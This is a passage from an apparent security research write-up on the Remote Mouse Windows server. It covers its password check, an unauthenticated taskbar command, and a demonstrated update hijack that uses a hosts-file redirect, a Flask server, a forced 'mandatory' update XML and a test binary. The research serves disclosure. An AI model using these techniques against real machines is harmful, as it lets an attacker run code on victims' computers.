<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>telnet 192.168.86.195 1978
Trying 192.168.86.195...
Connected to 192.168.86.195.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
SIN 15win <span class="nb">pwd pwd </span>300^CConnection closed by foreign host.
</code></pre></div></div>

<p>Cool, so the <code class="language-plaintext highlighter-rouge">pwd pwd</code> substring appears when there is a password, otherwise it’s <code class="language-plaintext highlighter-rouge">nop nop</code>. But let’s see if there’s anyway we can get past the authentication. Oddly enough, I’m having a hard time finding the encryption routine in the binary.</p>

<p>Finally after much more searching, I found the logic that handles password-protected sessions. It’s contained in <code class="language-plaintext highlighter-rouge">RemoteMouse.exe</code> in <code class="language-plaintext highlighter-rouge">Form1.b(object)</code>. The binary checks if <code class="language-plaintext highlighter-rouge">this.i</code> is set to true, and if so, sends the <code class="language-plaintext highlighter-rouge">pwd pwd 300</code> string, otherwise it sends the <code class="language-plaintext highlighter-rouge">nop nop 300</code> string.</p>

<p>Then it captures the three bytes of the next TCP transmission and checks if they equal <code class="language-plaintext highlighter-rouge">cin</code>. If they do, it uses the NEXT three bytes as the length to pull the next chunk of data, which is finally the hash that is sent over as authentication. The code snippet in question is below:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">@string</span> <span class="p">==</span> <span class="s">"cin"</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">dataFromSocket</span> <span class="p">=</span> <span class="n">Form1</span><span class="p">.</span><span class="nf">GetDataFromSocket</span><span class="p">(</span><span class="n">tcpClient</span><span class="p">,</span> <span class="m">3</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">dataFromSocket</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">goto</span> <span class="n">Block_7</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">len</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt32</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">dataFromSocket</span><span class="p">).</span><span class="nf">Trim</span><span class="p">());</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">dataFromSocket2</span> <span class="p">=</span> <span class="n">Form1</span><span class="p">.</span><span class="nf">GetDataFromSocket</span><span class="p">(</span><span class="n">tcpClient</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">dataFromSocket2</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">goto</span> <span class="n">Block_8</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">string</span><span class="p">[]</span> <span class="n">array3</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">dataFromSocket2</span><span class="p">).</span><span class="nf">Split</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span>
    <span class="p">{</span>
        <span class="sc">' '</span>
    <span class="p">});</span>
    <span class="kt">string</span> <span class="n">text3</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Form_Options</span><span class="p">.</span><span class="nf">MD5String</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">ReverseD</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">j</span><span class="p">))</span> <span class="p">==</span> <span class="n">array3</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">flag</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="n">text3</span> <span class="p">=</span> <span class="s">"cin  7success"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">flag</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="n">text3</span> <span class="p">=</span> <span class="s">"cin  4fail"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes2</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">text3</span><span class="p">);</span>
    <span class="k">try</span>
    <span class="p">{</span>
        <span class="n">tcpClient</span><span class="p">.</span><span class="n">Client</span><span class="p">.</span><span class="nf">Send</span><span class="p">(</span><span class="n">bytes2</span><span class="p">,</span> <span class="n">bytes2</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">SocketFlags</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>You can see that if the hashes match, it sets the <code class="language-plaintext highlighter-rouge">flag</code> variable to true, which all the other functions check for before continuing any business logic <strong>except</strong> where the next command chunk is <code class="language-plaintext highlighter-rouge">cur</code> or <code class="language-plaintext highlighter-rouge">hb1</code>. The <code class="language-plaintext highlighter-rouge">cur</code> logic, below, only modifies the <code class="language-plaintext highlighter-rouge">flag2</code> variable which is later looked at by the <code class="language-plaintext highlighter-rouge">mos</code> logic.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">@string</span> <span class="p">==</span> <span class="s">"cur"</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">num10</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">threeByteData7</span> <span class="p">=</span> <span class="n">Form1</span><span class="p">.</span><span class="nf">GetThreeByteData</span><span class="p">(</span><span class="n">tcpClient</span><span class="p">,</span> <span class="k">out</span> <span class="n">num10</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">threeByteData7</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">goto</span> <span class="n">Block_34</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">flag2</span> <span class="p">=</span> <span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">threeByteData7</span><span class="p">)</span> <span class="p">==</span> <span class="s">"xl"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">hb1</code> function seems to just send the characters back to the client? Odd, but not sure what it’s used for.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">@string</span> <span class="p">==</span> <span class="s">"hb1"</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes3</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"hb1"</span><span class="p">);</span>
    <span class="n">tcpClient</span><span class="p">.</span><span class="n">Client</span><span class="p">.</span><span class="nf">Send</span><span class="p">(</span><span class="n">bytes3</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Let’s look more closely at the <code class="language-plaintext highlighter-rouge">cin</code> logic to see if we can bypass the authentication, the <code class="language-plaintext highlighter-rouge">this.i</code> signifies that encryption is in fact, set. How is <code class="language-plaintext highlighter-rouge">this.i</code> determined? It’s in the <code class="language-plaintext highlighter-rouge">Form1.g(object, EventArgs)</code> function, which is the entry-point for the software. If the password exists in the UserAppDataRegistry, then the server is considering itself as encrypted. The UserAppDataRegistry just points to the <code class="language-plaintext highlighter-rouge">CurrentUser\Software\CompanyName\ProductName\ProductVersion</code> according to the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.application.userappdataregistry?view=net-5.0">documentation</a>. And sure enough, if we check, we see our password (MD5 hash of <code class="language-plaintext highlighter-rouge">123456</code>).</p>

<p><img src="/images/registry.png" alt="Registry" /></p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span>
<span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="n">j</span> <span class="p">=</span> <span class="n">Application</span><span class="p">.</span><span class="n">UserAppDataRegistry</span><span class="p">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="s">"Password"</span><span class="p">).</span><span class="nf">ToString</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">catch</span>
<span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="n">i</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="n">j</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">j</span><span class="p">.</span><span class="nf">Trim</span><span class="p">()</span> <span class="p">==</span> <span class="s">""</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="n">i</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">this</span><span class="p">.</span><span class="n">j</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="n">i</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Anyway, back to the <code class="language-plaintext highlighter-rouge">if (@string == "cin")</code> logic, the software splits a packet into a few different chunks. Given the client sending a message, i.e. <code class="language-plaintext highlighter-rouge">cin0361d8be84073da97f62df6123d50d1286e 240</code>, it gets split up into:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">cin</code> - Signifies the client is sending in data</li>
  <li><code class="language-plaintext highlighter-rouge">036</code> - The next three bytes are the ASCII representation of the number of bytes to read next</li>
  <li><code class="language-plaintext highlighter-rouge">1d8be84073da97f62df6123d50d1286e</code> - Some sort of hash</li>
  <li><code class="language-plaintext highlighter-rouge">240</code> - Never actually used</li>
</ol>

<p>Let’s look at the conditional that actually decides the pass/fail if the password is correct: <code class="language-plaintext highlighter-rouge">if (Form_Options.MD5String(this.ReverseD(this.j)) == array3[0] &amp;&amp; this.i)</code>). So it checks <code class="language-plaintext highlighter-rouge">this.i</code> to make sure encryption is set in the first place, then it takes the hash of the password stored in the registry, and reverses it. Passes the reversed hash into a custom MD5String function:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">MD5String</span><span class="p">(</span><span class="kt">string</span> <span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">MD5</span><span class="p">.</span><span class="nf">Create</span><span class="p">().</span><span class="nf">ComputeHash</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
    <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
    <span class="p">{</span>
        <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">Append</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">ToString</span><span class="p">(</span><span class="s">"x2"</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This function takes in the reversed MD5 hash, hashes <em>that</em> and then takes those bytes and converts them to ASCII as their hex representation, i.e. byte <code class="language-plaintext highlighter-rouge">0x7F</code> will turn into <code class="language-plaintext highlighter-rouge">7F</code>. To simplify this entire process, here’s a python snippet:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>

<span class="n">pwd</span> <span class="o">=</span> <span class="n">getRegValue</span><span class="p">(</span><span class="sa">r</span><span class="s">"Computer\HKEY_CURRENT_USER\SOFTWARE\remotemouse.net\Remote Mouse\3.0.1.5\Password"</span><span class="p">)</span>
<span class="n">pwd</span> <span class="o">=</span> <span class="n">pwd</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># reverse the string
</span><span class="n">pwd</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">pwd</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span>
</code></pre></div></div>

<p>And this ends up working when we put it all together to send our own password over:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])))</span>

<span class="n">pwd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
<span class="n">pwd</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">pwd</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="n">pwd</span> <span class="o">=</span> <span class="n">pwd</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># reverse the string
</span><span class="n">pwd</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">pwd</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="n">msg</span> <span class="o">=</span> <span class="s">'cin036'</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="s">' 240'</span>

<span class="k">print</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="s">'&lt;'</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'123456'</span> | python3 <span class="nb">test</span>/test.py 192.168.86.195 1978
<span class="o">&gt;</span> SIN 15win <span class="nb">pwd pwd </span>300
&lt; cin03674ce4a21f159e81638334cbe243cd2cf 240
<span class="o">&gt;</span> cin  7success
</code></pre></div></div>

<p>Unfortunately, to date, I don’t see how the authentication/password check can be bypassed without first sniffing someone’s password out from the air (either via the TCP handshake, or more importantly, via the UDP command packets).</p>
      <h2 id="autoupdate">
        
        
          AutoUpdate <a href="#autoupdate">#</a>
        
        
      </h2>
    

<p>While I was looking for the encryption algorithm, I found the autoupdating subroutine. It looks like updates are checked through this instruction: <code class="language-plaintext highlighter-rouge">AutoUpdater.Start("http://www.remotemouse.net/autoupdater/AutoUpdater.NET_AppCast_RM.xml", null);</code> But wait a minute, that’s HTTP, <strong>not</strong> HTTPS, so that means an attacker could machine-in-the-middle that URL and potentially deploy a malicious executable to the target machine.</p>

<p>To test this out, I’ll change the <code class="language-plaintext highlighter-rouge">C:\Windows\System32\drivers\etc\hosts</code> file to point <code class="language-plaintext highlighter-rouge">remotemouse.net</code> to my Kali VM, then I’ll run a Python Flask web server with the following files <code class="language-plaintext highlighter-rouge">/downloads/RemoteMouse.exe</code> and <code class="language-plaintext highlighter-rouge">/autoupdater/AutoUpdater.NET_AppCast_RM.xml</code>. Of course, I’ll be manually building/creating these files to host my own “malicious” content. The easiest way I can think of to make an executable do something that’s noticeable when it executes is a <code class="language-plaintext highlighter-rouge">MessageBox</code> in Windows. So I created a simple message to pop up and let me know the binary was executed:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">SYSTEMTIME</span> <span class="n">st</span><span class="p">,</span> <span class="n">lt</span><span class="p">;</span>
    <span class="n">GetSystemTime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
    <span class="n">GetLocalTime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">);</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">msgboxTitle</span> <span class="o">=</span> <span class="s">"Custom RemoteMouse.exe Execution"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">msgboxMsg</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="n">_snprintf_s</span><span class="p">(</span><span class="n">msgboxMsg</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="s">"RemoteMouse.exe executed at %02d/%02d/%02d %02d:%02d:%02d"</span><span class="p">,</span> <span class="n">lt</span><span class="p">.</span><span class="n">wMonth</span><span class="p">,</span> <span class="n">lt</span><span class="p">.</span><span class="n">wDay</span><span class="p">,</span> <span class="n">lt</span><span class="p">.</span><span class="n">wYear</span><span class="p">,</span> <span class="n">lt</span><span class="p">.</span><span class="n">wHour</span><span class="p">,</span> <span class="n">lt</span><span class="p">.</span><span class="n">wMinute</span><span class="p">,</span> <span class="n">lt</span><span class="p">.</span><span class="n">wSecond</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">msgboxID</span> <span class="o">=</span> <span class="n">MessageBoxA</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">msgboxMsg</span><span class="p">,</span>
        <span class="n">msgboxTitle</span><span class="p">,</span>
        <span class="n">MB_ICONEXCLAMATION</span>
    <span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>and my XML file is only slightly modified. I changed the version to be one minor step higher than what I am currently at:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;item&gt;</span>
    <span class="nt">&lt;title&gt;</span>New version 3.0.1.6 is available for Remote Mouse<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;version&gt;</span>3.0.1.6<span class="nt">&lt;/version&gt;</span>
    <span class="nt">&lt;url&gt;</span>http://www.remotemouse.net/downloads/RemoteMouse.exe<span class="nt">&lt;/url&gt;</span>
    <span class="nt">&lt;changelog&gt;</span>http://www.remotemouse.net/autoupdater/releasenotes_rm.html<span class="nt">&lt;/changelog&gt;</span>
<span class="nt">&lt;/item&gt;</span>
</code></pre></div></div>

<p>Then to spin up the Python Flask web server, I only need a few endpoints:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">flask</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/downloads/RemoteMouse.exe'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">exe</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">send_file</span><span class="p">(</span><span class="s">'RemoteMouse.exe'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/autoupdater/AutoUpdater.NET_AppCast_RM.xml'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">xml</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">send_file</span><span class="p">(</span><span class="s">'AutoUpdater.NET_AppCast_RM.xml'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/autoupdater/releasenotes_rm.html'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">changelog</span><span class="p">():</span>
    <span class="k">return</span> <span class="s">'&lt;h1&gt;There was a security vulnerability in the current version, update as soon as possible&lt;/h1&gt;'</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</code></pre></div></div>

<p>With all of this up and running, let’s boot up the server again. Nothing popped up, but if you do a manual update check, the new version comes up. It also contains our scary changelog and custom version number. You can still skip, cancel the update, and unfortunately, when I actually click “Update”, it fails to connect to the server.</p>

<p><img src="/images/xmlv1.png" alt="XML V1" /></p>

<p>Let’s up the version number to something higher and see if we can get the server to pop up an update dialog on start. I tried increasing the major number to <code class="language-plaintext highlighter-rouge">3.2.0.0</code> and we get a pop up this time on boot. Still the update is skipable…</p>

<p><img src="/images/xmlv2.png" alt="XML V2" /></p>

<p>Let’s investigate the binary to see what’s going on. Turns out the AutoUpdate functionality uses <a href="https://github.com/ravibpatel/AutoUpdater.NET">AutoUpdater.Net</a> to parse the XML file that is retrieved. So the function call to <code class="language-plaintext highlighter-rouge">AutoUpdater.Start</code> is actually calling this library, and this library takes it from here. One line in the README stood out to me, it’s describing the required/optional fields in the XML file describing the update when I saw this:</p>

<blockquote>
  <p>mandatory (Optional): You can set this to true if you don’t want user to skip this version. This will ignore Remind Later and Skip options and hide both Skip and Remind Later button on update dialog.</p>
</blockquote>

<p>So if we set the mandatory field in the XML file we can force a user to update? Or at least make it scary enough that they do so? I updated the XML file to:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;item&gt;</span>
    <span class="nt">&lt;title&gt;</span>New version 3.2.0.0 is available for Remote Mouse<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;version&gt;</span>3.2.0.0<span class="nt">&lt;/version&gt;</span>
    <span class="nt">&lt;url&gt;</span>http://www.remotemouse.net/downloads/RemoteMouse.exe<span class="nt">&lt;/url&gt;</span>
    <span class="nt">&lt;changelog&gt;</span>http://www.remotemouse.net/autoupdater/releasenotes_rm.html<span class="nt">&lt;/changelog&gt;</span>
    <span class="nt">&lt;mandatory&gt;</span>true<span class="nt">&lt;/mandatory&gt;</span>
<span class="nt">&lt;/item&gt;</span>
</code></pre></div></div>

<p>And rebooted the server to see this:</p>

<p><img src="/images/xmlv3.png" alt="XML V3" /></p>

<p>So we can make it pop up with a mandatory update! Let’s see if we can succesfully serve the binary, as well. I think the AutoUpdate.Net library might be a little smarter than the RemoteMouse binary, and force an HTTPS connection, so let’s spin up an Nginx reverse proxy and redirect 443 traffic to 80. I know this won’t successfully MITM someone, because of SSL errors (unless the developers explicitly ignore them…), but let’s see what happens. Here are two snippets from a <a href="https://gist.github.com/jessedearing/2351836">Gist</a> to do this quickly:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-x509</span> <span class="nt">-nodes</span> <span class="nt">-days</span> 365 <span class="nt">-newkey</span> rsa:1024  <span class="nt">-keyout</span> /etc/nginx/ssl/myssl.key  <span class="nt">-out</span> /etc/nginx/ssl/myssl.crt
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>server {
    listen               443 ssl;
    ssl_certificate      ssl/myssl.crt;
    ssl_certificate_key  ssl/myssl.key;
    server_name remotemouse.net;
    location / {
      proxy_set_header        Host $host;
      proxy_set_header        X-Real-IP $remote_addr;
      proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header        X-Forwarded-Proto $scheme;

      proxy_pass          http://127.0.0.1:80;
    }
}
</code></pre></div></div>

<p><img src="/images/custombinary.png" alt="MessageBox Success" /></p>

<p>Let’s reboot the server again, and… <strong>SUCCESS</strong>! The auto-updater worked and executed a binary that we served! Though, that’s a little odd, the nginx server logs don’t show any connections. To double-check, I turned off the nginx reverse-proxy, and ran it again, and it worked. This means we can succesfully MITM a target and serve them a malicious, custom exectuable with <strong>no</strong> HTTPS/TLS concerns.</p>

<p>All the necessary code/files to replicate are stored in <code class="language-plaintext highlighter-rouge">mitm/</code>.</p>
      <h2 id="uac-passthru">
        
        
          UAC Passthru <a href="#uac-passthru">#</a>
        
        
      </h2>
    

<p>I wanted to see if you could pass through and click “Ok” on a UAC pop-up. This isn’t anything gamechanging, but I thought it’d be pretty cool to see it work, especially if the malicious binary you served via the AutoUpdate feature requires elevated permissions. It would be hard to demonstrate without me taking a video of my phone and computer at the same time (and that could easily be spoofed), but it does in fact work. Your keyboard and mouse controls still work when the UAC popup happens.</p>
      <h2 id="icons">
        
        
          Icons <a href="#icons">#</a>
        
        
      </h2>
    

<p>I noticed in the Android App, one of the functionalities shows the icons you have on your taskbar (including the drawer). I decided to do another packet capture while making the request on my phone and saw that the App sends a TCP packet with the data <code class="language-plaintext highlighter-rouge">act</code> to the server, and the server dumps the file name, location, and PNG logo of the everything on the task bar.</p>

<p>Very curious to see if this is encrypted/password protected when the password is set. To check, I’ll telnet to make sure the password is required (will dump <code class="language-plaintext highlighter-rouge">pwd pwd</code>), and then send the <code class="language-plaintext highlighter-rouge">act</code> to port 1979:</p>

<p><img src="/images/image-nopass.png" alt="Logos No Password" /></p>

<p>This shows you can view anyone’s taskbar with no password whatsoever, even if the password is set on the server. This makes me think that only services provided by the server on port 1978 is password “protected”, if a password is set.</p>

<p>To better understand this workflow, let’s go ahead and find the logic inside the RemoteMouse binary. This actually took me about an hour of digging around, mainly because I’m not 100% familiar with dnSpy’s string search functionality. Anyway, I located the <code class="language-plaintext highlighter-rouge">"act"</code> string in the <code class="language-plaintext highlighter-rouge">q.a(object)</code> function inside <code class="language-plaintext highlighter-rouge">RemoteMouse.exe</code>. We can see there’s actually quite a few commands that you can send:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">opn</code> - I’m guessing this opens a program</li>
  <li><code class="language-plaintext highlighter-rouge">act</code> - This retrieves the logos and taskbar information</li>
  <li><code class="language-plaintext highlighter-rouge">max</code> - Maximize a program’s window</li>
  <li><code class="language-plaintext highlighter-rouge">min</code> - Minimize a program’s window</li>
  <li><code class="language-plaintext highlighter-rouge">clo</code> - Close a program’s window</li>
</ul>

<p>Let’s look at <code class="language-plaintext highlighter-rouge">clo</code>’s logic:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">if</span> <span class="p">(!(</span><span class="n">@string</span> <span class="p">==</span> <span class="s">"clo"</span><span class="p">))</span>
<span class="p">{</span>
    <span class="k">continue</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">goto</span> <span class="n">IL_1EB</span><span class="p">;</span>

<span class="c1">// ...snip...</span>

<span class="n">IL_1EB</span><span class="p">:</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array6</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">3</span><span class="p">];</span>
    <span class="n">num</span> <span class="p">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">Receive</span><span class="p">(</span><span class="n">array6</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="n">SocketFlags</span><span class="p">.</span><span class="n">None</span><span class="p">);</span>
